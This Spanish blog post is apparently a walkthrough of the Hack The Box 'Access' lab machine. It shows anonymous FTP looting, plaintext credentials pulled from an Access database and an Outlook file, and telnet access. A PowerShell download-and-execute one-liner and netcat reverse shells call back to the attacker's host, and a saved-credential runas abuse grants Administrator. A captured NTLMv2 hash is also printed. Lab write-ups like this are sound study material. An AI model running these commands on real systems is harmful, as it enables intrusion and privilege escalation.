---
title: Hack The Box Access
author: k4miyo
date: 2022-01-02
math: true
mermaid: true
image:
  path: /assets/images/htb/hackthebox.png
categories: [Easy, Windows]
tags: [Windows, Powershell]
ping: true
---

## Access
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.10.98.

```bash
❯ ping -c 1 10.10.10.98
PING 10.10.10.98 (10.10.10.98) 56(84) bytes of data.
64 bytes from 10.10.10.98: icmp_seq=1 ttl=127 time=260 ms

--- 10.10.10.98 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 259.704/259.704/259.704/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.98 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-01 20:58 CST
Initiating SYN Stealth Scan at 20:58
Scanning 10.10.10.98 [65535 ports]
SYN Stealth Scan Timing: About 50.00% done; ETC: 21:00 (0:00:46 remaining)
Discovered open port 23/tcp on 10.10.10.98
Discovered open port 80/tcp on 10.10.10.98
Discovered open port 21/tcp on 10.10.10.98
Completed SYN Stealth Scan at 21:00, 101.86s elapsed (65535 total ports)
Nmap scan report for 10.10.10.98
Host is up, received user-set (0.29s latency).
Scanned at 2022-01-01 20:58:39 CST for 102s
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 127
23/tcp open  telnet  syn-ack ttl 127
80/tcp open  http    syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 101.94 seconds
           Raw packets sent: 131069 (5.767MB) | Rcvd: 5 (220B)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬─────────────────────────────────────
       │ File: extractPorts.tmp
───────┼─────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.98
   5   │     [*] Open ports: 21,23,80
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sCV -p21,23,80 10.10.10.98 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-01 21:01 CST
Nmap scan report for 10.10.10.98
Host is up (0.24s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst: 
|_  SYST: Windows_NT
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: MegaCorp
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 190.08 seconds
```

Vemos el puerto 21 abierto y `nmap` nos indica que podria aceptar el usuario **anonymous**, así que vamos a echarle un ojo:

```bash
❯ ftp 10.10.10.98
Connected to 10.10.10.98.
220 Microsoft FTP Service
Name (10.10.10.98:k4miyo): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
150 Opening ASCII mode data connection.
08-23-18  08:16PM       <DIR>          Backups
08-24-18  09:00PM       <DIR>          Engineer
226 Transfer complete.
ftp>
```

Tenemos acceso y vemos dos directorios, vamos a tratar de descargarnos la info a nuestra máquina.

```bash
❯ wget -r --no-passive --no-parent ftp://anonymous:password@10.10.10.98 -P $(pwd)
--2022-01-02 16:29:14--  ftp://anonymous:*password*@10.10.10.98/            
           => «/home/k4miyo/Documentos/HTB/Access/content/10.10.10.98/.listing»
Conectando con 10.10.10.98:21... conectado.                                                                                      
Identificándose como anonymous ... ¡Dentro!
==> SYST ... hecho.   ==> PWD ... hecho. 
==> TYPE I ... hecho.  ==> no se necesita CWD.
==> PORT ... hecho.   ==> LIST ... hecho.                                                                                        

10.10.10.98/.listing                 [ <=>                                                    ]      97  --.-KB/s    en 0s      

==> PORT ... hecho.   ==> LIST ... hecho.                                                                                        
                                                                                                                                 
10.10.10.98/.listing                 [ <=>                                                    ]      97  --.-KB/s    en 0s      
                                
2022-01-02 16:29:15 (61.0 MB/s) - «/home/k4miyo/Documentos/HTB/Access/content/10.10.10.98/.listing» guardado [194]
                                
«/home/k4miyo/Documentos/HTB/Access/content/10.10.10.98/.listing» eliminado.
--2022-01-02 16:29:15--  ftp://anonymous:*password*@10.10.10.98/Backups/                                                        
           => «/home/k4miyo/Documentos/HTB/Access/content/10.10.10.98/Backups/.listing»
==> CWD (1) /Backups ... hecho.                                                                                                  
==> PORT ... hecho.   ==> LIST ... hecho.
                                                                                                                                 
10.10.10.98/Backups/.listing         [ <=>                                                    ]      51  --.-KB/s    en 0s      
                                
2022-01-02 16:29:16 (11.2 MB/s) - «/home/k4miyo/Documentos/HTB/Access/content/10.10.10.98/Backups/.listing» guardado [51]

«/home/k4miyo/Documentos/HTB/Access/content/10.10.10.98/Backups/.listing» eliminado.                                            
--2022-01-02 16:29:16--  ftp://anonymous:*password*@10.10.10.98/Backups/backup.mdb
           => «/home/k4miyo/Documentos/HTB/Access/content/10.10.10.98/Backups/backup.mdb»                                 
==> no se requiere CWD.
==> PORT ... hecho.   ==> RETR backup.mdb ... hecho.                                                                             
Longitud: 5652480 (5.4M)                                                                                                         
                                                                                                                                 
10.10.10.98/Backups/backup.mdb   100%[=======================================================>]   5.39M  2.31MB/s    en 2.3s    
                                                                
2022-01-02 16:29:19 (2.31 MB/s) - «/home/k4miyo/Documentos/HTB/Access/content/10.10.10.98/Backups/backup.mdb» guardado [5652480]

--2022-01-02 16:29:19--  ftp://anonymous:*password*@10.10.10.98/Engineer/                                                       
           => «/home/k4miyo/Documentos/HTB/Access/content/10.10.10.98/Engineer/.listing»
==> CWD (1) /Engineer ... hecho.                                                                                                 ==> PORT ... hecho.   ==> LIST ... hecho.

10.10.10.98/Engineer/.listing        [ <=>
                                
2022-01-02 16:29:19 (12.9 MB/s) - «/home/k4miyo/Documentos/HTB/Access/content/10.10.10.98/Engineer/.listing» guardado [59]

«/home/k4miyo/Documentos/HTB/Access/content/10.10.10.98/Engineer/.listing» eliminado.
--2022-01-02 16:29:19--  ftp://anonymous:*password*@10.10.10.98/Engineer/Access%20Control.zip
           => «/home/k4miyo/Documentos/HTB/Access/content/10.10.10.98/Engineer/Access Control.zip»
==> no se requiere CWD.
==> PORT ... hecho.   ==> RETR Access Control.zip ... hecho.
Longitud: 10870 (11K)

10.10.10.98/Engineer/Access Cont 100%[=======================================================>]  10.62K  37.3KB/s    en 0.3s    

2022-01-02 16:29:20 (37.3 KB/s) - «/home/k4miyo/Documentos/HTB/Access/content/10.10.10.98/Engineer/Access Control.zip» guardado [
10870]

ACABADO --2022-01-02 16:29:20--
Tiempo total de reloj: 6.1s
Descargados: 2 ficheros, 5.4M en 2.6s (2.07 MB/s)

❯ tree
.
└── 10.10.10.98
    ├── Backups
    │   └── backup.mdb
    └── Engineer
        └── Access Control.zip

3 directories, 2 files
```

Ya tenemos los recursos en nuestra máquina, en este caso como son pocos es posible, es caso de que fueran muchos, podríamos mejor hacer una montura. Vamos a ver que tipo de archivos son:

```bash
❯ file 10.10.10.98/Backups/backup.mdb
10.10.10.98/Backups/backup.mdb: Microsoft Access Database
❯ file 10.10.10.98/Engineer/Access\ Control.zip
10.10.10.98/Engineer/Access Control.zip: Zip archive data, at least v2.0 to extract
```

Vamos a empezar con el archivo `backup.mdb`, por lo que si ocupamos **Kali** o **Parrot** ya debemos tener instalada la herramienta `mdbtools`; por lo tanto, primero vamos a ver las tablas que la base de datos.

```bash
❯ mdb-tables 10.10.10.98/Backups/backup.mdb
acc_antiback acc_door acc_firstopen acc_firstopen_emp acc_holidays acc_interlock acc_levelset acc_levelset_door_group acc_linkageio acc_map acc_mapdoorpos acc_morecardempgroup acc_morecardgroup acc_timeseg acc_wiegandfmt ACGroup acholiday ACTimeZones action_log AlarmLog areaadmin att_attreport att_waitforprocessdata attcalclog attexception AuditedExc auth_group_permissions auth_message auth_permission auth_user auth_user_groups auth_user_user_permissions base_additiondata base_appoption base_basecode base_datatranslation base_operatortemplate base_personaloption base_strresource base_strtranslation base_systemoption CHECKEXACT CHECKINOUT dbbackuplog DEPARTMENTS deptadmin DeptUsedSchs devcmds devcmds_bak django_content_type django_session EmOpLog empitemdefine EXCNOTES FaceTemp iclock_dstime iclock_oplog iclock_testdata iclock_testdata_admin_area iclock_testdata_admin_dept LeaveClass LeaveClass1 Machines NUM_RUN NUM_RUN_DEIL operatecmds personnel_area personnel_cardtype personnel_empchange personnel_leavelog ReportItem SchClass SECURITYDETAILS ServerLog SHIFT TBKEY TBSMSALLOT TBSMSINFO TEMPLATE USER_OF_RUN USER_SPEDAY UserACMachines UserACPrivilege USERINFO userinfo_attarea UsersMachines UserUpdates worktable_groupmsg worktable_instantmsg worktable_msgtype worktable_usrmsg ZKAttendanceMonthStatistics acc_levelset_emp acc_morecardset ACUnlockComb AttParam auth_group AUTHDEVICE base_option dbapp_viewmodel FingerVein devlog HOLIDAYS personnel_issuecard SystemLog USER_TEMP_SCH UserUsedSClasses acc_monitor_log OfflinePermitGroups OfflinePermitUsers OfflinePermitDoors LossCard TmpPermitGroups TmpPermitUsers TmpPermitDoors ParamSet acc_reader acc_auxiliary STD_WiegandFmt CustomReport ReportField BioTemplate FaceTempEx FingerVeinEx TEMPLATEEx
❯ mdb-tables 10.10.10.98/Backups/backup.mdb | tr ' ' '\n' | grep -i -E 'user|auth|cred'
auth_group_permissions
auth_message
auth_permission
auth_user
auth_user_groups
auth_user_user_permissions
USER_OF_RUN
USER_SPEDAY
UserACMachines
UserACPrivilege
USERINFO
userinfo_attarea
UsersMachines
UserUpdates
auth_group
AUTHDEVICE
USER_TEMP_SCH
UserUsedSClasses
OfflinePermitUsers
TmpPermitUsers
```

Aqui ya vemos las tablas que nos podrían interesar y una en concreto sería `auth_user`, así que vamos a listar el contenido:

```bash
❯ mdb-export 10.10.10.98/Backups/backup.mdb auth_user
id,username,password,Status,last_login,RoleID,Remark
25,"admin","admin",1,"08/23/18 21:11:47",26,
27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
28,"backup_admin","admin",1,"08/23/18 21:14:02",26,
❯ mdb-export 10.10.10.98/Backups/backup.mdb auth_user | tr ',' ' '
id username password Status last_login RoleID Remark
25 "admin" "admin" 1 "08/23/18 21:11:47" 26 
27 "engineer" "access4u@security" 1 "08/23/18 21:13:36" 26 
28 "backup_admin" "admin" 1 "08/23/18 21:14:02" 26
```

Tenemos credenciales de usuarios, por lo que antes que cualquier cosa, vamos a guardarlas para no perderlas despúes. Si queremos obtener los resultados de una forma visual más bonita, podemos hacer uso de la herramienta online [MDBOpener](https://www.mdbopener.com/es.html)

![""](/assets/images/htb-access/access-mdb.png)

Si checamos las credenciales que tenemos, la del usuario **engineer** es muy personalizada y además, tenemos otro recurso llamado igual con un archivo comprimido; por lo que es posible que dicha contraseña la utilicemos para descomprimir el archivo `Access Control.zip`.

```bash
❯ 7z x Access\ Control.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_MX.UTF-8,Utf16=on,HugeFiles=on,64 bits,8 CPUs AMD Ryzen 7 PRO 4750G with Radeon Graphics (860F01),ASM,AES-NI)

Scanning the drive for archives:
1 file, 10870 bytes (11 KiB)

Extracting archive: Access Control.zip
--
Path = Access Control.zip
Type = zip
Physical Size = 10870

    
Enter password (will not be echoed):
Everything is Ok         

Size:       271360
Compressed: 10870
❯ ll
.rw-r--r-- root root 265 KB Thu Aug 23 19:13:52 2018  Access Control.pst
.rw-r--r-- root root  11 KB Fri Aug 24 00:16:00 2018  Access Control.zip
```

Vemos un archivo de extensión `pst`, que si no sabemos que es podemos buscarlo por internet o ejecutar un `file` sobre el archivo:

```bash
❯ file Access\ Control.pst
Access Control.pst: Microsoft Outlook email folder (>=2003)
```

Se trata de un archivo de Microsoft Outlook, por lo que para leerlo, utilizaremos la herramienta `readpst`.

```bash
❯ readpst Access\ Control.pst
Opening PST file and indexes...
Processing Folder "Deleted Items"
        "Access Control" - 2 items done, 0 items skipped.
❯ ll
.rw-r--r-- root root 3.0 KB Sun Jan  2 16:56:33 2022  Access Control.mbox
.rw-r--r-- root root 265 KB Thu Aug 23 19:13:52 2018  Access Control.pst
.rw-r--r-- root root  11 KB Fri Aug 24 00:16:00 2018  Access Control.zip
```

Ya se nos ha creado un archivo de extensión `mbox` el cual podemos visualizar su contenido con un `cat` o como en mi caso, con un `bat`:

```bash
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: Access Control.mbox
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ From "john@megacorp.com" Thu Aug 23 18:44:07 2018
   2   │ Status: RO
   3   │ From: john@megacorp.com <john@megacorp.com>
   4   │ Subject: MegaCorp Access Control System "security" account
   5   │ To: 'security@accesscontrolsystems.com'
   6   │ Date: Thu, 23 Aug 2018 23:44:07 +0000
   7   │ MIME-Version: 1.0
   8   │ Content-Type: multipart/mixed;
   9   │     boundary="--boundary-LibPST-iamunique-1277645120_-_-"
  10   │ 
  11   │ 
  12   │ ----boundary-LibPST-iamunique-1277645120_-_-
  13   │ Content-Type: multipart/alternative;
  14   │     boundary="alt---boundary-LibPST-iamunique-1277645120_-_-"
  15   │ 
  16   │ --alt---boundary-LibPST-iamunique-1277645120_-_-
  17   │ Content-Type: text/plain; charset="utf-8"
  18   │ 
  19   │ Hi there,
  20   │ 
  21   │  
  22   │ 
  23   │ The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your e
       │ ngineers.
  24   │ 
  25   │  
  26   │ 
  27   │ Regards,
  28   │ 
  29   │ John
  30   │ 
  31   │ 
  32   │ --alt---boundary-LibPST-iamunique-1277645120_-_-
  33   │ Content-Type: text/html; charset="us-ascii"
  34   │ 
  35   │ <html xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:w="urn:schemas-mic
       │ rosoft-com:office:word" xmlns:m="http://schemas.microsoft.com/office/2004/12/omml" xmlns="http://www.w3.org/TR/REC-html4
       │ 0"><head><meta http-equiv=Content-Type content="text/html; charset=us-ascii"><meta name=Generator content="Microsoft Wor
       │ d 15 (filtered medium)"><style><!--
  36   │ /* Font Definitions */
  37   │ @font-face
  38   │     {font-family:"Cambria Math";
  39   │     panose-1:0 0 0 0 0 0 0 0 0 0;}
  40   │ @font-face
  41   │     {font-family:Calibri;
  42   │     panose-1:2 15 5 2 2 2 4 3 2 4;}
  43   │ /* Style Definitions */
  44   │ p.MsoNormal, li.MsoNormal, div.MsoNormal
  45   │     {margin:0in;
  46   │     margin-bottom:.0001pt;
  47   │     font-size:11.0pt;
  48   │     font-family:"Calibri",sans-serif;}
  49   │ a:link, span.MsoHyperlink
  50   │     {mso-style-priority:99;
  51   │     color:#0563C1;
  52   │     text-decoration:underline;}
  53   │ a:visited, span.MsoHyperlinkFollowed
  54   │     {mso-style-priority:99;
  55   │     color:#954F72;
  56   │     text-decoration:underline;}
  57   │ p.msonormal0, li.msonormal0, div.msonormal0
  58   │     {mso-style-name:msonormal;
  59   │     mso-margin-top-alt:auto;
  60   │     margin-right:0in;
  61   │     mso-margin-bottom-alt:auto;
  62   │     margin-left:0in;
  63   │     font-size:11.0pt;
  64   │     font-family:"Calibri",sans-serif;}
  65   │ span.EmailStyle18
  66   │     {mso-style-type:personal-compose;
  67   │     font-family:"Calibri",sans-serif;
  68   │     color:windowtext;}
  69   │ .MsoChpDefault
  70   │     {mso-style-type:export-only;
  71   │     font-size:10.0pt;
  72   │     font-family:"Calibri",sans-serif;}
  73   │ @page WordSection1
  74   │     {size:8.5in 11.0in;
  75   │     margin:1.0in 1.0in 1.0in 1.0in;}
  76   │ div.WordSection1
  77   │     {page:WordSection1;}
  78   │ --></style><!--[if gte mso 9]><xml>
  79   │ <o:shapedefaults v:ext="edit" spidmax="1026" />
  80   │ </xml><![endif]--><!--[if gte mso 9]><xml>
  81   │ <o:shapelayout v:ext="edit">
  82   │ <o:idmap v:ext="edit" data="1" />
  83   │ </o:shapelayout></xml><![endif]--></head><body lang=EN-US link="#0563C1" vlink="#954F72"><div class=WordSection1><p clas
       │ s=MsoNormal>Hi there,<o:p></o:p></p><p class=MsoNormal><o:p>&nbsp;</o:p></p><p class=MsoNormal>The password for the &#82
       │ 20;security&#8221; account has been changed to 4Cc3ssC0ntr0ller.&nbsp; Please ensure this is passed on to your engineers
       │ .<o:p></o:p></p><p class=MsoNormal><o:p>&nbsp;</o:p></p><p class=MsoNormal>Regards,<o:p></o:p></p><p class=MsoNormal>Joh
       │ n<o:p></o:p></p></div></body></html>
  84   │ --alt---boundary-LibPST-iamunique-1277645120_-_---
  85   │ 
  86   │ ----boundary-LibPST-iamunique-1277645120_-_---
  87   │ 
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

```

Aqui ya vemos algo interesante, unas nuevas credenciales y también recordando, vemos el puerto 23 abierto, asociado al servicio TELNET; por lo que podríamos tratar de ingresar:

```bash
❯ telnet 10.10.10.98
Trying 10.10.10.98...
Connected to 10.10.10.98.
Escape character is '^]'.
Welcome to Microsoft Telnet Service 

login: security
password: 

*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security>whoami
access\security

C:\Users\security>
```

Y nos encontramos dentro de la máquina como el usuario `access\security` y ya podemos visualizar la flag (user.txt). Antes de enumerar un poco el sistema, vemos que no tenemos posibilidad de movernos libremente sobre la consola de telnet, por lo tanto, vamos a entablarnos una reverse shell para que sea más cómodo.

```bash
❯ locate Invoke-PowerShellTcp
/usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1
/usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1
/usr/share/nishang/Shells/Invoke-PowerShellTcpOneLineBind.ps1
❯ cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 PS.ps1
```

Agregamos al final del archivo `PS.ps1` la línea `Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.27 -Port 443` y ahora, compartimos un servidor HTTP con python, nos ponemos en escucha por el puerto 443 y ejecutamos lo siguiente en la máquina víctima.

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.98 - - [02/Jan/2022 17:15:26] "GET /PS.ps1 HTTP/1.1" 200 -
```

```bash
C:\Users\security>powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.27/PS.ps1')
```

```bash
❯ rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.98] 49158
Windows PowerShell running as user security on ACCESS
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

whoami
access\security
PS C:\Users\security>
```

Ahora si, vamos a enumrar un poco el sistema.

```bash
PS C:\Users> whoami /priv                                                                                                            [111/111]
                                                                
PRIVILEGES INFORMATION                                          
----------------------                                          
                                                                
Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

PS C:\Users> systeminfo                                                      
                                                                
Host Name:                 ACCESS         
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600                                                                               
OS Manufacturer:           Microsoft Corporation                                                                                 
OS Configuration:          Standalone Server                                                                                     
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User       
Registered Organization:                                        
Product ID:                55041-507-9857321-84191      
Original Install Date:     8/21/2018, 9:43:10 PM        
System Boot Time:          1/2/2022, 10:19:14 PM                                                                                 
System Manufacturer:       VMware, Inc.   
System Model:              VMware Virtual Platform
System Type:               x64-based PC   
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
                           [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows                           
System Directory:          C:\Windows\system32     
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC) Dublin, Edinburgh, Lisbon, London
Total Physical Memory:     2,047 MB       
Available Physical Memory: 1,505 MB       
Virtual Memory: Max Size:  4,095 MB       
Virtual Memory: Available: 3,533 MB       
Virtual Memory: In Use:    562 MB         
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB                                  
Logon Server:              N/A                                  
Hotfix(s):                 110 Hotfix(s) Installed.
...
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.98
                                 [02]: fe80::b93e:73a1:88ad:4648 
PS C:\Users> netstat -nat

Active Connections

  Proto  Local Address          Foreign Address        State           Offload State

  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:23             0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:49156          0.0.0.0:0              LISTENING       InHost      
  TCP    10.10.10.98:23         10.10.14.27:49786      ESTABLISHED     InHost      
  TCP    10.10.10.98:49158      10.10.14.27:443        ESTABLISHED     InHost      
  TCP    [::]:21                [::]:0                 LISTENING       InHost      
  TCP    [::]:23                [::]:0                 LISTENING       InHost      
  TCP    [::]:80                [::]:0                 LISTENING       InHost      
  TCP    [::]:135               [::]:0                 LISTENING       InHost      
  TCP    [::]:445               [::]:0                 LISTENING       InHost      
  TCP    [::]:47001             [::]:0                 LISTENING       InHost      
  TCP    [::]:49152             [::]:0                 LISTENING       InHost      
  TCP    [::]:49153             [::]:0                 LISTENING       InHost      
  TCP    [::]:49154             [::]:0                 LISTENING       InHost      
  TCP    [::]:49155             [::]:0                 LISTENING       InHost      
  TCP    [::]:49156             [::]:0                 LISTENING       InHost      
  UDP    0.0.0.0:123            *:*                                                
  UDP    0.0.0.0:500            *:*                                                
  UDP    0.0.0.0:4500           *:*                                                
  UDP    0.0.0.0:5355           *:*                                                
  UDP    0.0.0.0:59654          *:*                                                
  UDP    [::]:123               *:*                                                
  UDP    [::]:500               *:*                                                
  UDP    [::]:4500              *:*                                                
  UDP    [::]:5355              *:*                                                
  UDP    [fe80::b93e:73a1:88ad:4648%11]:546  *:*                                                
PS C:\Users>
```

Vemos que de acuerdo con al versión del sistema operativo, podríamos tratar de ejecutar el [MS11-046](https://github.com/abatchy17/WindowsExploits/blob/master/MS11-046/40564.c) o incluso, tratar de hacer un **Remote Port Forwarding** y conectarnos al puerto 445 para ejecutar el [MS17-010](https://github.com/worawit/MS17-010); pero para este caso, vamos a hacerlo de la forma en como fue pensada la máquina. Por lo tanto, si buscamos algos recursos curiosos dentro de la máquina, vemos que en la ruta `C:\Users\Public` no se observa el directorio `Desktop`; sin embargo, podemos acceder a el y vemos un acceso.

```bash
PS C:\Users> cd Public
PS C:\Users\Public> dir


    Directory: C:\Users\Public


Mode                LastWriteTime     Length Name                                                                               
----                -------------     ------ ----                                                                               
d-r--         7/14/2009   6:06 AM            Documents                                                                          
d-r--         7/14/2009   5:57 AM            Downloads                                                                          
d-r--         7/14/2009   5:57 AM            Music                                                                              
d-r--         7/14/2009   5:57 AM            Pictures                                                                           
d-r--         7/14/2009   5:57 AM            Videos                                                                             


PS C:\Users\Public> cd Desktop
PS C:\Users\Public\Desktop> dir


    Directory: C:\Users\Public\Desktop


Mode                LastWriteTime     Length Name                                                                               
----                -------------     ------ ----                                                                               
-a---         8/22/2018  10:18 PM       1870 ZKAccess3.5 Security System.lnk                                                    


PS C:\Users\Public\Desktop>
```

Vamos a crearnos un objecto para ver el cual es la ruta a la que apunta el acceso directo.

```bash
PS C:\Users\Public\Desktop> $sh = New-Object -ComObject Wscript.Shell
PS C:\Users\Public\Desktop> $target = $sh.CreateShortcut('C:\Users\Public\Desktop\ZKAccess3.5 Security System.lnk')
PS C:\Users\Public\Desktop> echo $target


FullName         : C:\Users\Public\Desktop\ZKAccess3.5 Security System.lnk
Arguments        : /user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"
Description      : 
Hotkey           : 
IconLocation     : C:\ZKTeco\ZKAccess3.5\img\AccessNET.ico,0
RelativePath     : 
TargetPath       : C:\Windows\System32\runas.exe
WindowStyle      : 1
WorkingDirectory : C:\ZKTeco\ZKAccess3.5



PS C:\Users\Public\Desktop> 
```

Aqui ya vemos cosas muy interesantes. Primero en **TargetPath** vemos `runas.exe`, que si no tenemos idea de lo que es, pues runas.exe es una herramienta de línea de comandos incluida en Windows a partir de Windows XP y Windows server 2003, la herramienta permite ejecutar una aplicación con permisos diferentes al usuario que actualmente tiene la sesión iniciada [jctsoluciones](https://www.jctsoluciones.com.co/uso-del-comando-runas-en-windows/); despúes en **Arguments** tenemos el usuario **Administrator** y el parámetro `/savecred` que hace referencia a que las credenciales de dicho usuario se encuentran guardadas y ya no es necesario conocer la contraseña. Por lo tanto, podríamos ejecutar `runas.exe`, pasandole los argumentos y en vez de lanzar `Access.exe`, nos podemos entablar una reverse shell.

Asi que vamos a un directorio donde tengamos permisos de escritura y nos compartimos el archivo `nc.exe` mediante un recurso compartido a nivel de red.

```bash
PS C:\Users\security> cd Desktop
PS C:\Users\security\Desktop> dir


    Directory: C:\Users\security\Desktop


Mode                LastWriteTime     Length Name                                                                               
----                -------------     ------ ----                                                                               
-a---         8/21/2018  11:37 PM         32 user.txt                                                                           


PS C:\Users\security\Desktop> mkdir test


    Directory: C:\Users\security\Desktop


Mode                LastWriteTime     Length Name                                                                               
----                -------------     ------ ----                                                                               
d----          1/3/2022  12:19 AM            test                                                                               


PS C:\Users\security\Desktop> cd test
PS C:\Users\security\Desktop\test> copy \\10.10.14.27\smbFolder\nc.exe nc.exe
PS C:\Users\security\Desktop\test> dir


    Directory: C:\Users\security\Desktop\test


Mode                LastWriteTime     Length Name                                                                               
----                -------------     ------ ----                                                                               
-a---          1/3/2022  12:00 AM      28160 nc.exe                                                                             


PS C:\Users\security\Desktop\test> 
```

```bash
❯ impacket-smbserver smbFolder $(pwd)
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.98,49159)
[*] AUTHENTICATE_MESSAGE (ACCESS\security,ACCESS)
[*] User ACCESS\security authenticated successfully
[*] security::ACCESS:aaaaaaaaaaaaaaaa:c332f6c0237137da4e4644e00a491165:010100000000000080b69c163700d801733f4cc843d845f5000000000100100067007a00680072007a00450050006a000300100067007a00680072007a00450050006a000200100069007a0073004b0078005100690050000400100069007a0073004b0078005100690050000700080080b69c163700d801060004000200000008003000300000000000000000000000002000002b50b2f3f6743d8f625c8c37ed5ede17540078931ebbe5138e18f68df3ba13f30a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0032003700000000000000000000000000
[-] Unknown level for query path info! 0x109
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:SMBFOLDER)
[*] Closing down connection (10.10.10.98,49159)
[*] Remaining connections []
```

Nos ponemos en escucha por el puerto 443 y nos entablamos una reverse shell.

```bash
PS C:\Users\security\Desktop\test> runas.exe /user:ACCESS\Administrator /savecred "nc.exe -e cmd 10.10.14.27 443"
PS C:\Users\security\Desktop\test>
```

```bash
❯ rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.98] 49160
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

whoami
whoami
access\administrator

C:\Windows\system32>
```

Ya somos el usuario **Administrator** y podemos visualizar la flag (root.txt).
